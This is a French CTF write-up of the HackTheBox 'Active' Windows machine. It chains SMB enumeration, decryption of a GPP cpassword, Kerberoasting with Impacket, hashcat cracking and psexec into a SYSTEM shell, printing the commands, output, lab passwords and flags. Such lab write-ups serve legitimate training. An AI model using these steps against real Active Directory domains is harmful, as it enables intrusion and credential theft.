# Solution du CTF Active de HackTheBox

Here we go again
----------------

Au moment de ces lignes je boucle la liste des CTF basés sur Windows actuellement actifs sur [HackTheBox](https://www.hackthebox.eu/). En attendant qu'une nouvelle machine fasse son apparition je me pencherais sans doute sur une machine UNIX histoire de ne pas perdre la main.  

Ce CTF baptisé *Active* et donc basé sur Windows m'a permis de découvrir une nouvelle fois des particularités de cet OS sur le plan pentest, et ça tombe bien car c'était l'objectif :)  

```plain
Nmap scan report for 10.10.10.100
Host is up (0.028s latency).
Not shown: 64560 closed ports, 952 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2018-08-10 14:47:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49182/tcp open  msrpc         Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 7 Ultimate SP1 or Windows 8.1 Update 1 (96%), Microsoft Windows 8.1 (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2018-08-10 16:48:08
|_  start_date: 2018-08-10 15:47:29

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   26.10 ms 10.10.14.1
2   28.70 ms 10.10.10.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 240.18 seconds
```

On remarque du LDAP, fouillons un peu plus avec un script Nmap spécifique :  

```plain
devloop@kali:~/Documents$ nmap -p 389 --script ldap-rootdse 10.10.10.100
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 17:14 CEST
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.027s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       currentTime: 20180810151417.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=active,DC=htb
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
|       namingContexts: DC=active,DC=htb
|       namingContexts: CN=Configuration,DC=active,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=active,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=active,DC=htb
|       defaultNamingContext: DC=active,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=active,DC=htb
|       configurationNamingContext: CN=Configuration,DC=active,DC=htb
|       rootDomainNamingContext: DC=active,DC=htb
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 90159
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: DC.active.htb
|       ldapServiceName: active.htb:dc$@ACTIVE.HTB
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 4
|       forestFunctionality: 4
|_      domainControllerFunctionality: 4
Service Info: Host: DC; OS: Windows 2008 R2

Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
```

C'est infos sont grosso-modo ce qu'on aurait obtenu avec la commande *ldapsearch -h 10.10.10.100 -p 389 -x -s base*.  

Cela nous servira plus tard si jamais on veut faire des requêtes sur le LDAP.  

Mais jetons d'abord un œil sur SMB pour savoir s'il y a des partages :  

```plain
$ smbclient -L //10.10.10.100 -U "" -N
WARNING: The "syslog" option is deprecated

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share
    Replication     Disk
    SYSVOL          Disk      Logon server share
    Users           Disk
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

La plupart nécessitent une authentification mais pas le partage *Replication* :  

```plain
$ smbclient  -U "" -N '//10.10.10.100/replication'
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  active.htb                          D        0  Sat Jul 21 12:37:44 2018

        10459647 blocks of size 4096. 4903493 blocks available
```

J'ai préféré ouvrir le gestionnaire de fichier puis recopier la totalité des fichiers en local. On trouve l'arborescence suivante et les types de fichiers suivants :  

```plain
$ tree
.
├── DfsrPrivate
│   ├── ConflictAndDeleted
│   ├── Deleted
│   └── Installing
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── Group Policy
│   │   │   └── GPE.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Preferences
│   │   │   │   └── Groups
│   │   │   │       └── Groups.xml
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts

21 directories, 7 files

./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI: ASCII text, with CRLF line terminators
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol: data
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf: Little-endian UTF-16 Unicode text, with CRLF, CR line terminators
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml: XML 1.0 document, ASCII text, with very long lines, with CRLF line terminators
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI: ASCII text, with CRLF line terminators
./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf: Little-endian UTF-16 Unicode text, with CRLF, CR line terminators
./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI: ASCII text, with CRLF line terminators
```

Le fichier template GPT ne nous est pas super utile mais donne des indications sur la dureté des mots de passe et leur absence de stockage au format LM :  

```plain
[Unicode]
Unicode=yes
[System Access]
MinimumPasswordAge = 1
MaximumPasswordAge = 42
MinimumPasswordLength = 7
PasswordComplexity = 1
PasswordHistorySize = 24
LockoutBadCount = 0
RequireLogonToChangePassword = 0
ForceLogoffWhenHourExpire = 0
ClearTextPassword = 0
LSAAnonymousNameLookup = 0
[Kerberos Policy]
MaxTicketAge = 10
MaxRenewAge = 7
MaxServiceAge = 600
MaxClockSkew = 5
TicketValidateClient = 1
[Registry Values]
MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
[Version]
signature="$CHICAGO$"
Revision=1
```

Le fichier *Groups.xml* semble plus utile, avec un mot de passe qui semble encodé à l'intérieur :  

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

En cherchant sur le web je finis par trouver exactement ce que je veux, à savoir [un script Python pour déchiffrer ce pass](https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py) :  

```plain
$ python Gpprefdecrypt.py edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

On a finalement un couple login/password qui s'avère valide. On peut ainsi accéder au partage *users* :  

```plain
$ smbclient  -U "SVC_TGS" '//10.10.10.100/users'
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\SVC_TGS's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 16:39:20 2018
  ..                                 DR        0  Sat Jul 21 16:39:20 2018
  Administrator                       D        0  Mon Jul 16 12:14:21 2018
  All Users                         DHS        0  Tue Jul 14 07:06:44 2009
  Default                           DHR        0  Tue Jul 14 08:38:21 2009
  Default User                      DHS        0  Tue Jul 14 07:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 06:57:55 2009
  Public                             DR        0  Tue Jul 14 06:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 17:16:32 2018

        10459647 blocks of size 4096. 4931883 blocks available
```

et récupérer le flag *user.txt* (86d67d8ba232bb6a254aa4d10159e983).  

Kansas City Shuffle
-------------------

Testons cet identifiant via psexec :  

```plain
$ python /usr/share/doc/python-impacket/examples/psexec.py active.htb/SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] Trying protocol 445/SMB...

[*] Requesting shares on 10.10.10.100.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'Replication' is not writable.
[-] share 'SYSVOL' is not writable.
[-] share 'Users' is not writable.
[*] Uploading file WcxwBFBv.exe
[-] Error uploading file WcxwBFBv.exe, aborting.....
[-] Error performing the installation, cleaning up: 'NoneType' object has no attribute 'split'
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

Et boom ([Shake the room!](https://www.youtube.com/watch?v=_PJPmokfTfQ)) ! Un shell... avec les droits NT\SYSTEM... OMG PWNIES WUT DID JUST HAPPENED ?  

En fait il semble que quelqu'un a du lancer un exploit et la machine s'est retrouvée dans un état... inattendu.  

Kerberoast 101
--------------

Pour avoir lu pas mal d'articles traitant de Windows/Kerberos, c'était compréhensible au vu du nom du compte récupéré (TGS => Ticket Granting Service) qu'on aurait à passer par *Kerberos*.  

La suite [Impacket](https://github.com/CoreSecurity/impacket) dispose de différents scripts liés à l'énumération/l'exploitation Windows dont certains directement relatifs à Kerberos.  

```plain
devloop@kali:~/Downloads/impacket-impacket_0_9_17$ PYTHONPATH=. python examples/GetUserSPNs.py -dc-ip 10.10.10.100 -outputfile /tmp/hashes.txt ACTIVE.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-07-30 19:17:40
```

Cela permet de récupérer les *Ticket de Services* (qui sont chiffrés avec le hash du compte correspondant servant à faire tourner ledit service). Une recherche sur Kerberoast vous permettra de retrouver les détails de l'attaque.  

Ici on voit CIFS (partage de fichier) tournant avec le compte Administrator.  

Impacket nous livre le ticket dans un format directement brute-forcable avec hashcat :  

```plain
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$3ec305740a094af09edd9778826a802--- snip ---869543e0b63
```

On lance alors hashcat avec la commande *hashcat64.bin -m 13100 -a 0 /tmp/hashes.txt /opt/wordlists/rockyou.txt*  

Cela nous donne le mot de passe *Ticketmaster1968* que l'on peut cette fois utiliser avec *psexec* :  

```plain
devloop@kali:~/Downloads/impacket-impacket_0_9_17$ PYTHONPATH=. python examples/psexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file PIIkmeAQ.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service coDf on 10.10.10.100.....
[*] Starting service coDf.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd c:/users/administrator/desktop

c:\Users\Administrator\Desktop>type root.txt
b5fc76d1d6b91d77b2fbf2d54d0f708b
```

Ça y est, cette fois résolu en suivant le chemin attendu :)

*Published December 08 2018 at 18:36*